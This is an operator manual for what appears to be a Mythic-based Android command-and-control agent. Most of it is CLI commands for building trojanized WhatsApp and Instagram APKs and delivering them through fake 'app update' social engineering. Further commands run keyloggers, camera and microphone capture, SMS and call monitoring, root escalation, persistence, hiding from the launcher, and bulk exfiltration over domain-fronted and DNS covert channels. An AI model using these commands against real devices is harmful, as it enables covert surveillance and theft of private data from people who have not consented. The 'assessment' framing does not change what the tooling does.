# Mythic Android Agent - Operator Manual

## Table of Contents

1. [Overview](#overview)
2. [Getting Started](#getting-started)
3. [Campaign Management](#campaign-management)
4. [Agent Operations](#agent-operations)
5. [Command Reference](#command-reference)
6. [C2 Profile Management](#c2-profile-management)
7. [Data Collection](#data-collection)
8. [Monitoring & Analytics](#monitoring--analytics)
9. [Troubleshooting](#troubleshooting)

## Overview

The Mythic Android Agent provides comprehensive mobile device monitoring and control capabilities. This manual covers day-to-day operations, command usage, and best practices for effective campaign management.

### Key Features
- **Multi-profile C2 Communication**: HTTPS, FCM Push, DNS Covert Channel
- **Android 12-16 Support**: Enhanced compatibility with modern Android versions
- **Modular Architecture**: Flexible module loading and configuration
- **Campaign Isolation**: Secure multi-campaign operations
- **Real-time Monitoring**: Live agent status and health monitoring

## Getting Started

### Initial Setup

After deployment, access the dashboard at `https://your-server:8080`

1. **Login** with default credentials (change immediately):
   - Username: `admin`
   - Password: `mythic_admin_2024`

2. **Create Your First Campaign**:
   ```bash
   # Using CLI
   mythic-cli campaign create --name "mobile_operation_1" --description "Android device monitoring"
   
   # Or via API
   curl -X POST https://your-server:8080/api/campaigns \
     -H "Authorization: Bearer $JWT_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{
       "name": "mobile_operation_1",
       "description": "Android device monitoring",
       "config": {
         "android_versions": ["13", "14"],
         "stealth_level": "high"
       }
     }'
   ```

### Dashboard Overview

The web dashboard provides:
- **Campaign Dashboard**: Overview of active operations
- **Agent Management**: Real-time agent status and control
- **Task Management**: Command queuing and results
- **File Browser**: Retrieved data and uploads
- **Analytics**: Campaign metrics and reporting
- **Settings**: Configuration and user management

## Campaign Management

### Creating Campaigns

```bash
# Create a new campaign
mythic-cli campaign create \
  --name "corporate_assessment" \
  --description "Corporate mobile device assessment" \
  --android-versions "13,14" \
  --modules "call_logger,filesystem,surveillance" \
  --c2-profile "https_beacon"
```

### Campaign Configuration

```yaml
# campaigns/corporate_assessment.yml
campaign:
  id: "corp_assess_2024"
  name: "Corporate Assessment 2024"
  description: "Mobile device security assessment"
  created: "2024-01-01T00:00:00Z"
  
settings:
  target_android_versions: ["13", "14"]
  stealth_level: "maximum"
  data_retention_days: 90
  
modules:
  enabled:
    - "call_logger"
    - "filesystem" 
    - "stealth_surveillance"
    - "network_sniffer"
    - "location_tracker"
  
  configurations:
    call_logger:
      log_all_calls: true
      record_audio: false
      max_recordings: 100
    
    filesystem:
      monitor_downloads: true
      scan_external_storage: true
      file_extensions: [".pdf", ".doc", ".txt", ".jpg"]
    
    surveillance:
      screenshot_interval: 300
      camera_monitoring: false
      microphone_monitoring: false

c2_profiles:
  primary: "https_beacon"
  fallback: ["fcm_push", "dns_covert"]
  
  https_beacon:
    server_url: "https://your-c2-server.com"
    beacon_interval: 300
    jitter_percent: 20
    
  fcm_push:
    firebase_project: "your-firebase-project"
    fallback_enabled: true
    
  dns_covert:
    domain: "tunnel.your-domain.com"
    encoding: "base32"
```

### Managing Campaign Lifecycle

```bash
# List campaigns
mythic-cli campaign list

# Get campaign details
mythic-cli campaign info --id corp_assess_2024

# Update campaign settings
mythic-cli campaign update --id corp_assess_2024 --stealth-level maximum

# Pause campaign (stop new agent deployments)
mythic-cli campaign pause --id corp_assess_2024

# Resume campaign
mythic-cli campaign resume --id corp_assess_2024

# Archive campaign (retain data, stop operations)
mythic-cli campaign archive --id corp_assess_2024

# Delete campaign (WARNING: destroys all data)
mythic-cli campaign delete --id corp_assess_2024 --confirm
```

## Agent Operations

### Building APK Payloads

```bash
# Basic APK generation
mythic-cli payload build \
  --campaign corp_assess_2024 \
  --target-app "com.whatsapp" \
  --android-version 14 \
  --obfuscation medium \
  --output payloads/whatsapp_modified.apk

# Advanced APK generation with specific features
mythic-cli payload build \
  --campaign corp_assess_2024 \
  --target-app "com.instagram.android" \
  --android-version 14 \
  --injection-method "manifest_merge" \
  --stealth-features "anti_analysis,root_bypass" \
  --persistence-method "boot_receiver" \
  --output payloads/instagram_enhanced.apk \
  --sign-apk \
  --keystore config/signing.keystore
```

### Payload Deployment

```bash
# Deploy to device via ADB
mythic-cli payload deploy \
  --apk payloads/whatsapp_modified.apk \
  --device "adb:192.168.1.100:5555" \
  --install-method "adb_install"

# Generate deployment package
mythic-cli payload package \
  --apk payloads/whatsapp_modified.apk \
  --include-installer \
  --social-engineering-template "app_update" \
  --output packages/whatsapp_update.zip
```

### Agent Management

```bash
# List active agents
mythic-cli agent list --campaign corp_assess_2024

# Get agent details
mythic-cli agent info --id agent_abc123def456

# Send command to agent
mythic-cli agent command \
  --id agent_abc123def456 \
  --module filesystem \
  --command "ls" \
  --args '{"path": "/sdcard/Downloads"}'

# Update agent configuration
mythic-cli agent config \
  --id agent_abc123def456 \
  --beacon-interval 600 \
  --stealth-mode true

# Remove agent
mythic-cli agent remove --id agent_abc123def456 --wipe-data
```

## Command Reference

### Core Agent Commands

#### System Information
```bash
# Get device information
mythic-cli agent command --id <agent_id> --module core --command system_info

# Get installed applications
mythic-cli agent command --id <agent_id> --module core --command list_apps

# Get device location
mythic-cli agent command --id <agent_id> --module core --command get_location

# Get network information
mythic-cli agent command --id <agent_id> --module core --command network_info
```

#### Filesystem Operations
```bash
# List directory contents
mythic-cli agent command --id <agent_id> --module filesystem --command ls --args '{"path": "/sdcard"}'

# Download file from device
mythic-cli agent command --id <agent_id> --module filesystem --command download --args '{"path": "/sdcard/important.pdf"}'

# Upload file to device
mythic-cli agent command --id <agent_id> --module filesystem --command upload --args '{"local_path": "files/payload.apk", "remote_path": "/sdcard/update.apk"}'

# Search for files
mythic-cli agent command --id <agent_id> --module filesystem --command find --args '{"pattern": "*.pdf", "path": "/sdcard"}'

# Monitor directory changes
mythic-cli agent command --id <agent_id> --module filesystem --command monitor --args '{"path": "/sdcard/Downloads", "recursive": true}'
```

#### Communication Monitoring
```bash
# Log phone calls
mythic-cli agent command --id <agent_id> --module call_logger --command start_logging

# Get call history
mythic-cli agent command --id <agent_id> --module call_logger --command get_history --args '{"days": 7}'

# Monitor SMS messages
mythic-cli agent command --id <agent_id> --module sms_logger --command start_monitoring

# Get contact list
mythic-cli agent command --id <agent_id> --module contacts --command export_contacts
```

#### Surveillance Operations
```bash
# Take screenshot
mythic-cli agent command --id <agent_id> --module surveillance --command screenshot

# Record audio (if permissions available)
mythic-cli agent command --id <agent_id> --module surveillance --command record_audio --args '{"duration": 30}'

# Monitor clipboard
mythic-cli agent command --id <agent_id> --module surveillance --command monitor_clipboard

# Capture camera image
mythic-cli agent command --id <agent_id> --module surveillance --command camera_capture --args '{"camera": "front"}'

# Start keylogger
mythic-cli agent command --id <agent_id> --module surveillance --command start_keylogger
```

#### Network Operations
```bash
# Network scan
mythic-cli agent command --id <agent_id> --module network --command scan_network

# Monitor network traffic
mythic-cli agent command --id <agent_id> --module network --command start_packet_capture --args '{"duration": 300}'

# Get Wi-Fi networks
mythic-cli agent command --id <agent_id> --module network --command list_wifi_networks

# Proxy configuration
mythic-cli agent command --id <agent_id> --module network --command set_proxy --args '{"host": "proxy.example.com", "port": 8080}'
```

### Advanced Commands

#### Privilege Escalation
```bash
# Check root status
mythic-cli agent command --id <agent_id> --module privilege --command check_root

# Attempt root escalation
mythic-cli agent command --id <agent_id> --module privilege --command escalate --args '{"method": "auto"}'

# Check accessibility service
mythic-cli agent command --id <agent_id> --module privilege --command check_accessibility

# Request device admin
mythic-cli agent command --id <agent_id> --module privilege --command request_device_admin
```

#### Persistence
```bash
# Check current persistence methods
mythic-cli agent command --id <agent_id> --module persistence --command status

# Enable boot persistence
mythic-cli agent command --id <agent_id> --module persistence --command enable_boot_receiver

# Enable service persistence
mythic-cli agent command --id <agent_id> --module persistence --command enable_service_watchdog

# Hide from app list
mythic-cli agent command --id <agent_id> --module stealth --command hide_from_launcher
```

#### Data Exfiltration
```bash
# Export database files
mythic-cli agent command --id <agent_id> --module exfil --command export_databases

# Backup application data
mythic-cli agent command --id <agent_id> --module exfil --command backup_app_data --args '{"package": "com.whatsapp"}'

# Export browser data
mythic-cli agent command --id <agent_id> --module exfil --command export_browser_data

# Bulk file collection
mythic-cli agent command --id <agent_id> --module exfil --command collect_files --args '{"extensions": [".pdf", ".doc"], "max_size_mb": 100}'
```

## C2 Profile Management

### Profile Configuration

```bash
# List available C2 profiles
mythic-cli c2 list

# Get profile status
mythic-cli c2 status --profile https_beacon

# Update profile configuration
mythic-cli c2 config --profile https_beacon --beacon-interval 600

# Switch agent to different profile
mythic-cli agent switch-c2 --id <agent_id> --profile fcm_push

# Test profile connectivity
mythic-cli c2 test --profile dns_covert --target-domain tunnel.example.com
```

### Profile-Specific Commands

#### HTTPS Beacon
```bash
# Configure domain fronting
mythic-cli c2 config --profile https_beacon \
  --domain-fronting true \
  --front-domain cdn.cloudflare.com \
  --real-domain your-c2.herokuapp.com

# Set custom headers
mythic-cli c2 config --profile https_beacon \
  --custom-headers '{"X-Forwarded-For": "192.168.1.1", "User-Agent": "Mozilla/5.0"}'

# Enable certificate pinning bypass
mythic-cli c2 config --profile https_beacon --bypass-pinning true
```

#### FCM Push
```bash
# Update Firebase configuration
mythic-cli c2 config --profile fcm_push \
  --service-account config/firebase-new-project.json

# Configure message priority
mythic-cli c2 config --profile fcm_push --priority high

# Test FCM connectivity
mythic-cli c2 test --profile fcm_push --test-token <fcm_token>
```

#### DNS Covert Channel
```bash
# Update DNS configuration
mythic-cli c2 config --profile dns_covert \
  --domain new-tunnel.example.com \
  --encoding base64 \
  --chunk-size 200

# Test DNS resolution
mythic-cli c2 test --profile dns_covert --test-query test.new-tunnel.example.com

# Configure DNS-over-HTTPS
mythic-cli c2 config --profile dns_covert --doh-provider google
```

## Data Collection

### Retrieving Agent Data

```bash
# Download all files from agent
mythic-cli data download --agent <agent_id> --all --output downloads/agent_data/

# Get specific file types
mythic-cli data download --agent <agent_id> --types "images,documents" --output downloads/

# Export structured data
mythic-cli data export --agent <agent_id> --format json --output reports/agent_data.json

# Get call logs
mythic-cli data get --agent <agent_id> --type call_logs --days 30 --output call_logs.csv

# Download surveillance data
mythic-cli data get --agent <agent_id> --type screenshots --last-hours 24
```

### Data Analysis

```bash
# Generate agent report
mythic-cli report generate --agent <agent_id> --format pdf --output reports/

# Campaign summary
mythic-cli report campaign --id corp_assess_2024 --include-charts --output summary.pdf

# Timeline analysis
mythic-cli analysis timeline --agent <agent_id> --start-date 2024-01-01 --end-date 2024-01-31

# Search across collected data
mythic-cli data search --campaign corp_assess_2024 --query "password" --file-types "text,documents"
```

## Monitoring & Analytics

### Real-time Monitoring

```bash
# Monitor agent activity
mythic-cli monitor agents --campaign corp_assess_2024 --real-time

# Watch specific agent
mythic-cli monitor agent --id <agent_id> --show-commands

# Monitor C2 traffic
mythic-cli monitor c2 --profile https_beacon --show-traffic

# System health monitoring
mythic-cli monitor system --show-performance
```

### Analytics Dashboard

Access analytics at `https://your-server:8080/analytics`

#### Key Metrics
- **Agent Health**: Connection status, last seen, performance metrics
- **Command Execution**: Success rates, execution times, error patterns
- **Data Collection**: Volume of data collected, file types, growth trends
- **C2 Performance**: Profile usage, connection reliability, bandwidth utilization

#### Custom Queries
```sql
-- Top active agents by data collected
SELECT agent_id, device_model, 
       SUM(data_collected_mb) as total_data
FROM agent_metrics 
WHERE campaign_id = 'corp_assess_2024'
GROUP BY agent_id, device_model
ORDER BY total_data DESC
LIMIT 10;

-- Command success rates
SELECT command_type, 
       COUNT(*) as total_commands,
       SUM(CASE WHEN success = true THEN 1 ELSE 0 END) as successful,
       ROUND(AVG(execution_time_ms), 2) as avg_time_ms
FROM command_history 
WHERE timestamp >= NOW() - INTERVAL '7 days'
GROUP BY command_type
ORDER BY total_commands DESC;
```

### Alerting

```bash
# Configure agent disconnect alerts
mythic-cli alert create \
  --type agent_disconnect \
  --threshold 600 \
  --action email \
  --recipients "operator@example.com"

# Set up data volume alerts
mythic-cli alert create \
  --type data_volume \
  --threshold-mb 1000 \
  --period daily \
  --action webhook \
  --webhook-url "https://slack.example.com/webhook"

# Configure command failure alerts
mythic-cli alert create \
  --type command_failure \
  --threshold-percent 20 \
  --period hourly \
  --action sms \
  --phone "+1234567890"
```

## Troubleshooting

### Common Issues

#### Agent Connection Problems
```bash
# Check agent connectivity
mythic-cli agent ping --id <agent_id>

# View agent logs
mythic-cli logs agent --id <agent_id> --lines 100

# Test C2 profile
mythic-cli c2 test --profile https_beacon --agent <agent_id>

# Force agent reconnection
mythic-cli agent reconnect --id <agent_id>
```

#### Command Execution Failures
```bash
# Check command status
mythic-cli command status --id <command_id>

# View command logs
mythic-cli logs command --id <command_id>

# Retry failed command
mythic-cli command retry --id <command_id>

# Check agent permissions
mythic-cli agent permissions --id <agent_id>
```

#### Performance Issues
```bash
# Check system resources
mythic-cli system status --detailed

# View slow queries
mythic-cli system slow-queries --threshold 1000

# Database maintenance
mythic-cli system maintenance --vacuum --analyze

# Clear old logs
mythic-cli system cleanup --older-than 30d
```

### Diagnostic Commands

```bash
# System diagnostics
mythic-cli diagnose system --output diagnose_system.txt

# Agent diagnostics
mythic-cli diagnose agent --id <agent_id> --output diagnose_agent.txt

# C2 profile diagnostics
mythic-cli diagnose c2 --profile https_beacon --output diagnose_c2.txt

# Network connectivity test
mythic-cli diagnose network --test-all-profiles
```

### Log Analysis

```bash
# Search logs for errors
mythic-cli logs search --level error --last-hours 24

# Filter logs by component
mythic-cli logs filter --component c2_https_beacon --lines 500

# Export logs for analysis
mythic-cli logs export --format json --output logs_export.json --date-range "2024-01-01,2024-01-31"

# Real-time log monitoring
mythic-cli logs tail --follow --filter "error|warning"
```

## Best Practices

### Operational Security
1. **Regular Password Rotation**: Change default passwords and rotate regularly
2. **Access Control**: Implement least-privilege access for operators
3. **Network Segmentation**: Isolate C2 infrastructure from other networks
4. **Monitoring**: Continuously monitor for suspicious activity
5. **Backup**: Maintain regular backups of critical data and configurations

### Campaign Management
1. **Documentation**: Maintain detailed records of all operations
2. **Data Retention**: Implement appropriate data retention policies
3. **Legal Compliance**: Ensure operations comply with applicable laws
4. **Testing**: Regularly test backup and recovery procedures
5. **Updates**: Keep the system updated with latest security patches

### Performance Optimization
1. **Resource Monitoring**: Monitor system resources and scale as needed
2. **Database Maintenance**: Regular database optimization and cleanup
3. **Log Management**: Implement log rotation and archival
4. **Caching**: Configure appropriate caching for frequently accessed data
5. **Load Balancing**: Use load balancers for high-availability deployments

---

For additional support and advanced configuration options, see the [Troubleshooting Guide](troubleshooting.md) and [API Documentation](api_documentation.md).
